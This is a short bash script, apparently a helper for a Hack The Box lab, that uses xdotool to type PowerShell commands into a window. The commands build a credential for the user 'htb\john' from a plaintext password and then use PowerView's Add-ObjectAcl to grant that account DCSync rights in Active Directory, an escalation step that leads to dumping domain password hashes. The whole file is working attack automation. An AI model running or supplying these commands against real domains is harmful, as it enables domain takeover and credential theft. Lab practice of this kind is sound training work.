#!/bin/bash

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

paste_command "$pass = convertto-securestring 'abc123!' -asplain -force"
xdotool key Return

paste_command "$cred = new-object system.management.automation.pscredential('htb\john', $pass)"
xdotool key Return

paste_command "Add-ObjectAcl -PrincipalIdentity john -Credential $cred -Rights DCSync"
xdotool key Return

